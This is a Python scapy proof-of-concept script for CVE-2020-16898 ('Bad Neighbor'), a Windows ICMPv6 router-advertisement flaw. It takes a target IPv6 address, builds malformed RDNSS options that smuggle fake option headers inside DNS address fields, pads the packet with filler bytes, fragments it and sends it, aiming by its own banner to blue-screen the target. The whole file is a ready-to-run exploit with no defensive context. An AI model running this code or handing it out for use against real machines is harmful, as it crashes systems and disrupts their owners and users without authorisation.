#!/usr/bin/python
# -*- coding: UTF-8 -*-
import sys
from scapy.all import *

print("***************************************************")
print("** BSOD BADNEIGHBOR PoC (CVE-2020-16898)         **")
print("** Version: 1.0                                  **")
print("** Release: 10/17/2020                           **")
print("** By: Jiansiting                                **")
print("***************************************************")
print(" ")

if len(sys.argv)<2 :
    print("[*] Error IP V6 Address!")
else:
    dst = sys.argv[1]
    hdr = IPv6(dst = dst, hlim = 255)
    ra = ICMPv6ND_RA() 
    opt  = '19'
    opt += '26'
    opt += ':4242:4242:4242'
    smuggled = '0102:0304:0506:0708:' + opt
    rdns = ICMPv6NDOptRDNSS(dns=['5a5a:5a5a:5a5a:5a5a:5a5a:5a5a:5a5a:5a5a', smuggled])
    rdns.len = 4

    smuggled  = '18'
    smuggled += '22'
    smuggled += ':5a5a:5a5a:5a5a:5a5a:5a5a:5a5a:5a5a'

    rdns_2 = ICMPv6NDOptRDNSS(dns=['5a5a:5a5a:5a5a:5a5a:5a5a:5a5a:5a5a:5a5a', smuggled])

    rdns_2.len = 4

    overwrite = '\x43'*256

    f_hdr = IPv6ExtHdrFragment()

    p = hdr/f_hdr/ra/rdns/rdns_2/overwrite

    fragments = fragment6(p, 100)

    for frag in fragments:
        send(frag)
